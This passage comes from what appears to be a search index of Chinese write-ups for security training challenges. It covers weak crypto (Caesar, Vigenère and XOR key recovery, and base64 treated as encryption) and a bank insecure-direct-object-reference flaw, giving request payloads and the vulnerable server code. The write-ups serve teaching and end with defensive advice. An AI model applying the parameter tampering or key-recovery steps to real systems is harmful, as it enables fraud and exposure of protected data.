\u8fd9\u4e2a\u539f\u9898\u611f\u89c9\u6bd4\u8f83\u522b\u626d\uff0c\u56e0\u6b64\u5c06\u5176\u4fee\u6539\u7684\u66f4\u52a0\u5bb9\u6613\u7406\u89e3. \u9700\u8981\u83b7\u5f97\u5c55\u793a\u7684\u5bc6\u6587\u7684\u660e\u6587\u4fe1\u606f\u5373\u53ef, \u5bc6\u6587\u662f\u4f7f\u7528\u51ef\u6492\u5bc6\u7801\u8fdb\u884c\u52a0\u5bc6,\u4f4d\u79fb\u662f5 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u65e0\u540e\u7aef\u5b9e\u73b0 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u4e3b\u8981\u7406\u89e3\u51ef\u6492\u5bc6\u7801\u662f\u4e00\u4e2a\u6bd4\u8f83\u5f31\u7684\u52a0\u5bc6\u65b9\u6cd5\uff0c\u662f\u5c06\u6bcf\u4e2a\u5b57\u7b26\u5411\u540e\u79fb\u52a8\u56fa\u5b9a\u4f4d\u6570,\u5373\u4f4d\u79fb,\u5982\u7b2c\u4e00\u4e2a\u5b57\u7b26r,\u89e3\u5bc6\u65f6\u5411\u524d5\u4e2a\u5b57\u7b26\u4e3am,\u5176\u4ed6\u5b57\u7b26\u4e00\u6837\u8ba1\u7b97\u5373\u53ef \u603b\u7ed3 \u00b6 \u52a0\u5bc6\u662f\u5e38\u7528\u800c\u4e14\u975e\u5e38\u6709\u6548\u7684\u9632\u5fa1\u65b9\u6cd5\uff0c\u4f46\u4e0d\u5b89\u5168\u7684\u52a0\u5bc6\u7b97\u6cd5\u3001\u4e0d\u5f53\u7684\u5bc6\u94a5\u7ba1\u7406\uff0c\u65e0\u6cd5\u8fbe\u5230\u771f\u6b63\u7684\u5b89\u5168 \u9700\u8981\u9009\u62e9\u88ab\u9a8c\u8bc1\u8fc7\u7684\u52a0\u5bc6\u7b97\u6cd5: \u5982AES256,RSA\u7b49 \u5bc6\u94a5\u7981\u6b62\u660e\u6587\u4fdd\u5b58,\u5982\u679c\u80fd\u5b9a\u671f\u66f4\u6362\u5c31\u66f4\u597d\u4e86 \u6c49\u5316\u8bf4\u660e \u00b6 \u6dfb\u52a0\u6c49\u5316\u6587\u4ef6 src/main/resources/i18n/challenges/insecureCryptoStorage/insecureCryptoStorage_zh.properties \u4fee\u6539 /src/main/webapp/challenges/x9c408d23e75ec92495e0caf9a544edb2ee8f624249f3e920663edb733f15cd7.jsp \u5220\u9664 Ymj wjxzqy pjd ktw ymnx qjxxts nx ymj ktqqtbnsl xywnsl;","title":"Insecure Cryptographic Storage Challenge 1(\u4e0d\u5b89\u5168\u7684\u52a0\u5bc6\u5b58\u50a8 1)"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-1.html#insecure-cryptographic-storage-challenge-1-1","text":"","title":"Insecure Cryptographic Storage Challenge 1(\u4e0d\u5b89\u5168\u7684\u52a0\u5bc6\u5b58\u50a8 1"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-1.html#_1","text":"\u8fd9\u4e2a\u539f\u9898\u611f\u89c9\u6bd4\u8f83\u522b\u626d\uff0c\u56e0\u6b64\u5c06\u5176\u4fee\u6539\u7684\u66f4\u52a0\u5bb9\u6613\u7406\u89e3. \u9700\u8981\u83b7\u5f97\u5c55\u793a\u7684\u5bc6\u6587\u7684\u660e\u6587\u4fe1\u606f\u5373\u53ef, \u5bc6\u6587\u662f\u4f7f\u7528\u51ef\u6492\u5bc6\u7801\u8fdb\u884c\u52a0\u5bc6,\u4f4d\u79fb\u662f5","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-1.html#_2","text":"\u65e0\u540e\u7aef\u5b9e\u73b0","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-1.html#_3","text":"\u4e3b\u8981\u7406\u89e3\u51ef\u6492\u5bc6\u7801\u662f\u4e00\u4e2a\u6bd4\u8f83\u5f31\u7684\u52a0\u5bc6\u65b9\u6cd5\uff0c\u662f\u5c06\u6bcf\u4e2a\u5b57\u7b26\u5411\u540e\u79fb\u52a8\u56fa\u5b9a\u4f4d\u6570,\u5373\u4f4d\u79fb,\u5982\u7b2c\u4e00\u4e2a\u5b57\u7b26r,\u89e3\u5bc6\u65f6\u5411\u524d5\u4e2a\u5b57\u7b26\u4e3am,\u5176\u4ed6\u5b57\u7b26\u4e00\u6837\u8ba1\u7b97\u5373\u53ef","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-1.html#_4","text":"\u52a0\u5bc6\u662f\u5e38\u7528\u800c\u4e14\u975e\u5e38\u6709\u6548\u7684\u9632\u5fa1\u65b9\u6cd5\uff0c\u4f46\u4e0d\u5b89\u5168\u7684\u52a0\u5bc6\u7b97\u6cd5\u3001\u4e0d\u5f53\u7684\u5bc6\u94a5\u7ba1\u7406\uff0c\u65e0\u6cd5\u8fbe\u5230\u771f\u6b63\u7684\u5b89\u5168 \u9700\u8981\u9009\u62e9\u88ab\u9a8c\u8bc1\u8fc7\u7684\u52a0\u5bc6\u7b97\u6cd5: \u5982AES256,RSA\u7b49 \u5bc6\u94a5\u7981\u6b62\u660e\u6587\u4fdd\u5b58,\u5982\u679c\u80fd\u5b9a\u671f\u66f4\u6362\u5c31\u66f4\u597d\u4e86","title":"\u603b\u7ed3"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-1.html#_5","text":"\u6dfb\u52a0\u6c49\u5316\u6587\u4ef6 src/main/resources/i18n/challenges/insecureCryptoStorage/insecureCryptoStorage_zh.properties \u4fee\u6539 /src/main/webapp/challenges/x9c408d23e75ec92495e0caf9a544edb2ee8f624249f3e920663edb733f15cd7.jsp \u5220\u9664 Ymj wjxzqy pjd ktw ymnx qjxxts nx ymj ktqqtbnsl xywnsl;","title":"\u6c49\u5316\u8bf4\u660e"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-2.html","text":"Insecure Cryptographic Storage Challenge 2(\u4e0d\u5b89\u5168\u52a0\u5bc6\u5b58\u50a8 2) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u672c\u9898\u4f7f\u7528\u4e86\u4e0d\u5b89\u5168\u7684\u52a0\u5bc6\u51fd\u6570\uff0c\u76f4\u63a5\u53ef\u4ee5\u83b7\u5f97\u660e\u6587\u6570\u636e \u529f\u80fd\u5b9e\u73b0 \u00b6 \u53d1\u73b0\u672c\u9898\u5e76\u6ca1\u6709\u53d1\u9001\u7f51\u7edc\u8bf7\u6c42\uff0c\u56e0\u6b64\u67e5\u770bhtml\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u662fjavascript\u5b9e\u73b0\u7684\u52a0\u5bc6 var input = $(\"#resultKeyAttempt\").val(); theKey = \"kpoisaijdieyjaf\"; var theAlphabet = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" + \"abcdefghijklmnopqrstuvwxyz\"; // Validate theKey: theKey = theKey.toUpperCase(); var theKeysLength = theKey.length; var i; var adjustedKey = \"\"; for(i = 0; i < theKeysLength; i ++) { var currentKeyChar = theAlphabet.indexOf(theKey.charAt(i)); if(currentKeyChar < 0) continue; adjustedKey += theAlphabet.charAt(currentKeyChar); } theKey = adjustedKey; theKeysLength = theKey.length; // Transform input: var inputLength = input.length; var output = \"\"; var theKeysCurrentIndex = 0; for(i = 0; i < inputLength; i ++) { var currentChar = input.charAt(i); var currentCharValue = theAlphabet.indexOf(currentChar); if(currentCharValue < 0) { output += currentChar; continue; } var lowercase = currentCharValue >= 26 ? true : false; currentCharValue += theAlphabet.indexOf(theKey.charAt(theKeysCurrentIndex)); currentCharValue += 26; if(lowercase) currentCharValue = currentCharValue % 26 + 26; else currentCharValue %= 26; output += theAlphabet.charAt(currentCharValue); theKeysCurrentIndex =(theKeysCurrentIndex + 1) % theKeysLength; } // Check result for validity $(\"#resultDiv\").hide(\"fast\", function(){ if(output == \"DwsDagmwhziArpmogWaSmmckwhMoEsmgmxlivpDttfjbjdxqBwxbKbCwgwgUyam\") $('#resultDiv').html(\"<p>Yeah, that's correct</p>\"); else $('#resultDiv').html(\"<p>No, that's not correct</p>\"); $(\"#resultDiv\").show(\"slow\"); }); \u4ece\u4ee3\u7801\u77e5\u9053\uff0c\u6700\u7ec8\u5f97\u5230\u7684\u8f93\u51fa\u7ed3\u679c\u4e3a DwsDagmwhziArpmogWaSmmckwhMoEsmgmxlivpDttfjbjdxqBwxbKbCwgwgUyam \u5bc6\u94a5\u662f theKey \u53d8\u91cf\u503c \u89e3\u9898\u6b65\u9aa4 \u00b6 \u628a\u5bc6\u6587\u53d8\u6210\u660e\u6587\u8f93\u5165\uff0c\u5c06 currentCharValue += theAlphabet.indexOf(theKey.charAt(theKeysCurrentIndex)); \u4fee\u6539\u4e3a currentCharValue -= theAlphabet.indexOf(theKey.charAt(theKeysCurrentIndex)); \u5373\u53ef \u603b\u7ed3 \u00b6 \u4e0d\u8981\u4f7f\u7528\u4e0d\u5b89\u5168\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5bc6\u94a5\u4e00\u5b9a\u8981\u59a5\u5584\u4fdd\u7ba1","title":"Insecure Cryptographic Storage Challenge 2(\u4e0d\u5b89\u5168\u52a0\u5bc6\u5b58\u50a8 2)"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-2.html#insecure-cryptographic-storage-challenge-2-2","text":"","title":"Insecure Cryptographic Storage Challenge 2(\u4e0d\u5b89\u5168\u52a0\u5bc6\u5b58\u50a8 2)"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-2.html#_1","text":"\u672c\u9898\u4f7f\u7528\u4e86\u4e0d\u5b89\u5168\u7684\u52a0\u5bc6\u51fd\u6570\uff0c\u76f4\u63a5\u53ef\u4ee5\u83b7\u5f97\u660e\u6587\u6570\u636e","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-2.html#_2","text":"\u53d1\u73b0\u672c\u9898\u5e76\u6ca1\u6709\u53d1\u9001\u7f51\u7edc\u8bf7\u6c42\uff0c\u56e0\u6b64\u67e5\u770bhtml\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u662fjavascript\u5b9e\u73b0\u7684\u52a0\u5bc6 var input = $(\"#resultKeyAttempt\").val(); theKey = \"kpoisaijdieyjaf\"; var theAlphabet = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" + \"abcdefghijklmnopqrstuvwxyz\"; // Validate theKey: theKey = theKey.toUpperCase(); var theKeysLength = theKey.length; var i; var adjustedKey = \"\"; for(i = 0; i < theKeysLength; i ++) { var currentKeyChar = theAlphabet.indexOf(theKey.charAt(i)); if(currentKeyChar < 0) continue; adjustedKey += theAlphabet.charAt(currentKeyChar); } theKey = adjustedKey; theKeysLength = theKey.length; // Transform input: var inputLength = input.length; var output = \"\"; var theKeysCurrentIndex = 0; for(i = 0; i < inputLength; i ++) { var currentChar = input.charAt(i); var currentCharValue = theAlphabet.indexOf(currentChar); if(currentCharValue < 0) { output += currentChar; continue; } var lowercase = currentCharValue >= 26 ? true : false; currentCharValue += theAlphabet.indexOf(theKey.charAt(theKeysCurrentIndex)); currentCharValue += 26; if(lowercase) currentCharValue = currentCharValue % 26 + 26; else currentCharValue %= 26; output += theAlphabet.charAt(currentCharValue); theKeysCurrentIndex =(theKeysCurrentIndex + 1) % theKeysLength; } // Check result for validity $(\"#resultDiv\").hide(\"fast\", function(){ if(output == \"DwsDagmwhziArpmogWaSmmckwhMoEsmgmxlivpDttfjbjdxqBwxbKbCwgwgUyam\") $('#resultDiv').html(\"<p>Yeah, that's correct</p>\"); else $('#resultDiv').html(\"<p>No, that's not correct</p>\"); $(\"#resultDiv\").show(\"slow\"); }); \u4ece\u4ee3\u7801\u77e5\u9053\uff0c\u6700\u7ec8\u5f97\u5230\u7684\u8f93\u51fa\u7ed3\u679c\u4e3a DwsDagmwhziArpmogWaSmmckwhMoEsmgmxlivpDttfjbjdxqBwxbKbCwgwgUyam \u5bc6\u94a5\u662f theKey \u53d8\u91cf\u503c","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-2.html#_3","text":"\u628a\u5bc6\u6587\u53d8\u6210\u660e\u6587\u8f93\u5165\uff0c\u5c06 currentCharValue += theAlphabet.indexOf(theKey.charAt(theKeysCurrentIndex)); \u4fee\u6539\u4e3a currentCharValue -= theAlphabet.indexOf(theKey.charAt(theKeysCurrentIndex)); \u5373\u53ef","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-2.html#_4","text":"\u4e0d\u8981\u4f7f\u7528\u4e0d\u5b89\u5168\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5bc6\u94a5\u4e00\u5b9a\u8981\u59a5\u5584\u4fdd\u7ba1","title":"\u603b\u7ed3"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-3.html","text":"Insecure Cryptographic Storage Challenge 3(\u4e0d\u5b89\u5168\u52a0\u5bc6\u5b58\u50a8 3) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u901a\u5173\u5bc6\u94a5\u662f\u52a0\u5bc6\u5bc6\u94a5\u7684\u5927\u5199\u5f62\u5f0f \u529f\u80fd\u5b9e\u73b0 \u00b6 \u901a\u8fc7\u63d0\u793a\u77e5\u9053\u9700\u8981\u8f93\u5165\u7684\u5e94\u8be5\u662f\u4e00\u4e2abase64\u7f16\u7801\u6570\u636e \u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/2da053b4afb1530a500120a49a14d422ea56705a7e3fc405a77bc269948ccae1 HTTP/1.1 userData=IAAAAEkQBhEVBwpDHAFJGhYHSBYEGgocAw%3D%3D \u5bf9\u5e94\u4ee3\u7801 try { String userData = request.getParameter(\"userData\"); //\u83b7\u5f97\u7528\u6237\u8f93\u5165 log.debug(\"User Submitted - \" + userData); log.debug(\"Decrypting user input\"); //Using level key as encryption key String decryptedUserData = decrypt(userData, levelResult); //\u89e3\u5bc6\u6570\u636e \uff0clevelResult \u662f\u5bc6\u94a5 log.debug(\"Decrypted to: \" + decryptedUserData); htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"insecureCyrptoStorage.3.plaintextResult\") + \"</h2><p>\" + bundle.getString(\"insecureCyrptoStorage.3.plaintextResult.message\") + \"<br/><br/><em>\" + Encode.forHtml(decryptedUserData) + \"</em></p>\"; } catch(Exception e) { log.fatal(levelName + \" - \" + e.toString()); htmlOutput = errors.getString(\"error.funky\"); } out.write(htmlOutput); //\u5177\u4f53\u89e3\u5bc6\u51fd\u6570 public static String decrypt(String hash, String key) throws Exception { try { return new String(xor(org.apache.commons.codec.binary.Base64.decodeBase64(hash.getBytes()), key), \"UTF-8\"); } catch (java.io.UnsupportedEncodingException ex) { throw new IllegalStateException(ex); } } /** * XOR Function * @param input Byte array to be XOR'd * @param key Encryption Key * @return */ private static byte[] xor(final byte[] input, String theKey) { final byte[] output = new byte[input.length]; final byte[] secret = theKey.getBytes(); int spos = 0; for (int pos = 0; pos < input.length; pos += 1) { output[pos] = (byte) (input[pos] ^ secret[spos]); spos += 1; if (spos >= secret.length) { spos = 0; } } return output; } \u89e3\u9898\u6b65\u9aa4 \u00b6 \u52a0\u5bc6\u662fxor,\u53ea\u67090 xor X = X, \u5e0c\u671b\u83b7\u5f97\u5bc6\u94a5\uff0c\u901a\u5173\u63d0\u793a\u5bc6\u94a5\u662f\u5927\u5199\u5b57\u6bcd \u67e5\u770bASCII\u8868 \uff0c\u5927\u5199\u5b57\u6bcd\u7684ASCII, \u5982 0101 1010(\u4ece\u5de6\u5230\u53f3 \u7b2c6\u548c8\u4f4d\u90fd\u662f0)\uff0c\u5c0f\u5199\u5b57\u6bcd\u7684ASCII\uff0c\u59820111 1010(\u4ece\u5de6\u5230\u53f3 \u7b2c6\u662f1,\u7b2c8\u4f4d\u662f0) \u6240\u4ee5\u5927\u5199\u5b57\u6bcd xor \u5bf9\u5e94\u5c0f\u5199\u5b57\u6bcd = \u7a7a\u683c \uff0c\u5373z xor Z = \u7a7a\u683c \u56e0\u6b64\u5c06\u7a7a\u683c\u505abase64\u7f16\u7801\u63d0\u4ea4\u5373\u53ef\uff0c \u7a7a\u683c\u957f\u5ea6\uff0c\u9700\u8981\u4e0d\u65ad\u5c1d\u8bd5 \u603b\u7ed3 \u00b6 \u5982\u679c\u4e0d\u516c\u5f00\u52a0\u5bc6\u7b97\u6cd5\uff0c\u9ed1\u76d2\u6d4b\u8bd5\u8fd8\u662f\u6709\u4e00\u4e9b\u96be\u5ea6\u7684\uff0c\u52a0\u5bc6\u5c3d\u53ef\u80fd\u4f7f\u7528\u6807\u51c6\u7b97\u6cd5\u5982AES\uff0c\u4e0d\u8981\u4f9d\u8d56\u52a0\u5bc6\u7b97\u6cd5\u4e0d\u6cc4\u9732\uff0c\u6765\u4fdd\u8bc1\u5b89\u5168","title":"Insecure Cryptographic Storage Challenge 3(\u4e0d\u5b89\u5168\u52a0\u5bc6\u5b58\u50a8 3)"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-3.html#insecure-cryptographic-storage-challenge-3-3","text":"","title":"Insecure Cryptographic Storage Challenge 3(\u4e0d\u5b89\u5168\u52a0\u5bc6\u5b58\u50a8 3)"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-3.html#_1","text":"\u901a\u5173\u5bc6\u94a5\u662f\u52a0\u5bc6\u5bc6\u94a5\u7684\u5927\u5199\u5f62\u5f0f","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-3.html#_2","text":"\u901a\u8fc7\u63d0\u793a\u77e5\u9053\u9700\u8981\u8f93\u5165\u7684\u5e94\u8be5\u662f\u4e00\u4e2abase64\u7f16\u7801\u6570\u636e \u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/2da053b4afb1530a500120a49a14d422ea56705a7e3fc405a77bc269948ccae1 HTTP/1.1 userData=IAAAAEkQBhEVBwpDHAFJGhYHSBYEGgocAw%3D%3D \u5bf9\u5e94\u4ee3\u7801 try { String userData = request.getParameter(\"userData\"); //\u83b7\u5f97\u7528\u6237\u8f93\u5165 log.debug(\"User Submitted - \" + userData); log.debug(\"Decrypting user input\"); //Using level key as encryption key String decryptedUserData = decrypt(userData, levelResult); //\u89e3\u5bc6\u6570\u636e \uff0clevelResult \u662f\u5bc6\u94a5 log.debug(\"Decrypted to: \" + decryptedUserData); htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"insecureCyrptoStorage.3.plaintextResult\") + \"</h2><p>\" + bundle.getString(\"insecureCyrptoStorage.3.plaintextResult.message\") + \"<br/><br/><em>\" + Encode.forHtml(decryptedUserData) + \"</em></p>\"; } catch(Exception e) { log.fatal(levelName + \" - \" + e.toString()); htmlOutput = errors.getString(\"error.funky\"); } out.write(htmlOutput); //\u5177\u4f53\u89e3\u5bc6\u51fd\u6570 public static String decrypt(String hash, String key) throws Exception { try { return new String(xor(org.apache.commons.codec.binary.Base64.decodeBase64(hash.getBytes()), key), \"UTF-8\"); } catch (java.io.UnsupportedEncodingException ex) { throw new IllegalStateException(ex); } } /** * XOR Function * @param input Byte array to be XOR'd * @param key Encryption Key * @return */ private static byte[] xor(final byte[] input, String theKey) { final byte[] output = new byte[input.length]; final byte[] secret = theKey.getBytes(); int spos = 0; for (int pos = 0; pos < input.length; pos += 1) { output[pos] = (byte) (input[pos] ^ secret[spos]); spos += 1; if (spos >= secret.length) { spos = 0; } } return output; }","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-3.html#_3","text":"\u52a0\u5bc6\u662fxor,\u53ea\u67090 xor X = X, \u5e0c\u671b\u83b7\u5f97\u5bc6\u94a5\uff0c\u901a\u5173\u63d0\u793a\u5bc6\u94a5\u662f\u5927\u5199\u5b57\u6bcd \u67e5\u770bASCII\u8868 \uff0c\u5927\u5199\u5b57\u6bcd\u7684ASCII, \u5982 0101 1010(\u4ece\u5de6\u5230\u53f3 \u7b2c6\u548c8\u4f4d\u90fd\u662f0)\uff0c\u5c0f\u5199\u5b57\u6bcd\u7684ASCII\uff0c\u59820111 1010(\u4ece\u5de6\u5230\u53f3 \u7b2c6\u662f1,\u7b2c8\u4f4d\u662f0) \u6240\u4ee5\u5927\u5199\u5b57\u6bcd xor \u5bf9\u5e94\u5c0f\u5199\u5b57\u6bcd = \u7a7a\u683c \uff0c\u5373z xor Z = \u7a7a\u683c \u56e0\u6b64\u5c06\u7a7a\u683c\u505abase64\u7f16\u7801\u63d0\u4ea4\u5373\u53ef\uff0c \u7a7a\u683c\u957f\u5ea6\uff0c\u9700\u8981\u4e0d\u65ad\u5c1d\u8bd5","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-3.html#_4","text":"\u5982\u679c\u4e0d\u516c\u5f00\u52a0\u5bc6\u7b97\u6cd5\uff0c\u9ed1\u76d2\u6d4b\u8bd5\u8fd8\u662f\u6709\u4e00\u4e9b\u96be\u5ea6\u7684\uff0c\u52a0\u5bc6\u5c3d\u53ef\u80fd\u4f7f\u7528\u6807\u51c6\u7b97\u6cd5\u5982AES\uff0c\u4e0d\u8981\u4f9d\u8d56\u52a0\u5bc6\u7b97\u6cd5\u4e0d\u6cc4\u9732\uff0c\u6765\u4fdd\u8bc1\u5b89\u5168","title":"\u603b\u7ed3"},{"location":"vul/Insecure-Cryptographic-Storage.html","text":"Insecure Cryptographic Storage(\u4e0d\u5b89\u5168\u7684\u52a0\u5bc6\u5b58\u50a8) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u6839\u636e\u9875\u9762\u663e\u793a\u7684\u4fe1\u7528\u5361\u5bc6\u6587\u4fe1\u606f\u83b7\u5f97\u5bf9\u5e94\u7684\u660e\u6587\u4fe1\u606f \u529f\u80fd\u5b9e\u73b0 \u00b6 \u6ca1\u6709\u540e\u7aef\u64cd\u4f5c \u89e3\u9898\u6b65\u9aa4 \u00b6 \u7531\u4e8e\u9875\u9762\u4e0a\u4fe1\u606f\u4f7f\u7528base64\u7f16\u7801\uff0c\u76f4\u63a5base64\u89e3\u5bc6\u5373\u53ef\u83b7\u5f97\u660e\u6587\u4fe1\u606f \u603b\u7ed3 \u00b6 \u52a0\u5bc6\u662f\u5e38\u7528\u800c\u4e14\u975e\u5e38\u6709\u6548\u7684\u9632\u5fa1\u65b9\u6cd5\uff0c\u4f46\u4e0d\u5b89\u5168\u7684\u52a0\u5bc6\u7b97\u6cd5\u3001\u4e0d\u5f53\u7684\u5bc6\u94a5\u7ba1\u7406\uff0c\u65e0\u6cd5\u8fbe\u5230\u771f\u6b63\u7684\u5b89\u5168 \u9700\u8981\u9009\u62e9\u88ab\u9a8c\u8bc1\u8fc7\u7684\u52a0\u5bc6\u7b97\u6cd5: \u5982AES256,RSA\u7b49 \u5bc6\u94a5\u7981\u6b62\u660e\u6587\u4fdd\u5b58,\u5982\u679c\u80fd\u5b9a\u671f\u66f4\u6362\u5c31\u66f4\u597d\u4e86","title":"Insecure Cryptographic Storage(\u4e0d\u5b89\u5168\u7684\u52a0\u5bc6\u5b58\u50a8)"},{"location":"vul/Insecure-Cryptographic-Storage.html#insecure-cryptographic-storage","text":"","title":"Insecure Cryptographic Storage(\u4e0d\u5b89\u5168\u7684\u52a0\u5bc6\u5b58\u50a8)"},{"location":"vul/Insecure-Cryptographic-Storage.html#_1","text":"\u9700\u8981\u6839\u636e\u9875\u9762\u663e\u793a\u7684\u4fe1\u7528\u5361\u5bc6\u6587\u4fe1\u606f\u83b7\u5f97\u5bf9\u5e94\u7684\u660e\u6587\u4fe1\u606f","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Insecure-Cryptographic-Storage.html#_2","text":"\u6ca1\u6709\u540e\u7aef\u64cd\u4f5c","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Insecure-Cryptographic-Storage.html#_3","text":"\u7531\u4e8e\u9875\u9762\u4e0a\u4fe1\u606f\u4f7f\u7528base64\u7f16\u7801\uff0c\u76f4\u63a5base64\u89e3\u5bc6\u5373\u53ef\u83b7\u5f97\u660e\u6587\u4fe1\u606f","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Insecure-Cryptographic-Storage.html#_4","text":"\u52a0\u5bc6\u662f\u5e38\u7528\u800c\u4e14\u975e\u5e38\u6709\u6548\u7684\u9632\u5fa1\u65b9\u6cd5\uff0c\u4f46\u4e0d\u5b89\u5168\u7684\u52a0\u5bc6\u7b97\u6cd5\u3001\u4e0d\u5f53\u7684\u5bc6\u94a5\u7ba1\u7406\uff0c\u65e0\u6cd5\u8fbe\u5230\u771f\u6b63\u7684\u5b89\u5168 \u9700\u8981\u9009\u62e9\u88ab\u9a8c\u8bc1\u8fc7\u7684\u52a0\u5bc6\u7b97\u6cd5: \u5982AES256,RSA\u7b49 \u5bc6\u94a5\u7981\u6b62\u660e\u6587\u4fdd\u5b58,\u5982\u679c\u80fd\u5b9a\u671f\u66f4\u6362\u5c31\u66f4\u597d\u4e86","title":"\u603b\u7ed3"},{"location":"vul/Insecure-Direct-Object-Reference-Bank-Challenge.html","text":"Insecure Direct Object Reference Bank Challenge(\u94f6\u884c\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u8fd9\u4e2a\u9898\u9700\u8981\u6ce8\u518c\u4e00\u4e2a\u4e2a\u4eba\u8d26\u6237\uff0c\u5e76\u4e14\u628a\u4e2a\u4eba\u8d26\u6237\u5b58\u6b3e\u589e\u52a0\u5230\u5927\u4e8e5000000 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8fd9\u4e2a\u9898\u6709\u5f88\u591a\u8fc7\u7a0b\uff0c\u6ce8\u518c\u3001\u767b\u5f55\u90fd\u6ca1\u6709\u53d1\u73b0\u5b89\u5168\u95ee\u9898 \u5728\u67e5\u770b\u4e2a\u4eba\u5b58\u6b3e\u529f\u80fd\u65f6 POST /challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cCurrentBalance HTTP/1.1 accountNumber=2 \u53d1\u73b0\u5f53\u524d\u8d26\u6237id\u662f2\uff0c\u81ea\u7136\u60f3\u5230\u8fd8\u6709\u4e2a\u8d26\u53f7id=1\uff0c\u53d1\u73b0id=1\u91d1\u989d\u6bd4\u8f83\u591a \u5728\u770b\u8f6c\u8d26\u529f\u80fd POST /challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cTransfer HTTP/1.1 senderAccountNumber=2&recieverAccountNumber=1&transferAmount=500000 \u6821\u9a8c\u4e86\u8f6c\u8d26\u7684\u91d1\u989d\u5fc5\u987b\u5927\u4e8e0 \uff0c\u53d1\u9001\u8005\u4f59\u989d\u5fc5\u987b\u5927\u4e8e\u8f6c\u8d26\u91d1\u989d String senderAccountNumber = request.getParameter(\"senderAccountNumber\"); log.debug(\"Sender Account Number - \" + senderAccountNumber); String recieverAccountNumber = request.getParameter(\"recieverAccountNumber\"); log.debug(\"Reciever Account Number - \" + recieverAccountNumber); String transferAmountString = request.getParameter(\"transferAmount\"); log.debug(\"Transfer Amount - \" + transferAmountString); float tranferAmount = Float.parseFloat(transferAmountString); //Data Validation //Positive Transfer Amount? if(tranferAmount > 0) //\u8f6c\u8d26\u91d1\u989d\u4e3a\u6b63 { //Sender Account Has necessary funds? float senderFunds = DirectObjectBankLogin.getAccountBalance(senderAccountNumber, applicationRoot); if((senderFunds-tranferAmount) > 0) //\u4f59\u989d\u4e0d\u80fd\u4e3a\u8d1f { //Check Receiver Account Exists try { float recieverAccountBalanace = DirectObjectBankLogin.getAccountBalance(recieverAccountNumber, applicationRoot); if(recieverAccountBalanace >= 0) performTransfer = true; } catch(Exception e) { log.debug(\"Reciever Account does not exist. Cancelling\"); errorMessage = bundle.getString(\"transfer.error.recieverNotFound\"); } } else errorMessage = bundle.getString(\"transfer.error.notEnoughCash\"); } else errorMessage = bundle.getString(\"transfer.error.moreThanZero\"); \u95ee\u9898\u662f\u6ca1\u6709\u6821\u9a8c\u8f6c\u8d26\u53d1\u9001\u8005\u548c\u63a5\u6536\u8005\uff0c\u5bfc\u81f4\u4efb\u610f\u6dfb\u52a0\u8f6c\u8d26\u7684\u53d1\u9001\u8005\u548c\u63a5\u6536\u8005 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u5c06\u63a5\u6536\u8005recieverAccountNumber \u4fee\u6539\u4e3a\u81ea\u5df1id \u5373\u53ef \u603b\u7ed3 \u00b6 \u4e0d\u8981\u4fe1\u4efb\u5ba2\u6237\u7aef\u4f20\u9012\u7684\u6570\u636e","title":"Insecure Direct Object Reference Bank Challenge(\u94f6\u884c\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528)"},{"location":"vul/Insecure-Direct-Object-Reference-Bank-Challenge.html#insecure-direct-object-reference-bank-challenge","text":"","title":"Insecure Direct Object Reference Bank 